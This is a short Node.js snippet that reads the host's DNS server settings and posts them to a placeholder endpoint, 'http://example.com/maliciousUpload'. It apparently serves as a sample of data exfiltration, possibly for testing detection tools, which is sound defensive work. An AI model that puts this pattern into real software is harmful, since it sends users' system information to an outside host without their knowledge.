const dns = require("dns");

const dnsServers = dns.getServers()
console.log('DNS:', dnsServers)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post',
    body: { dnsServers }
  }
)
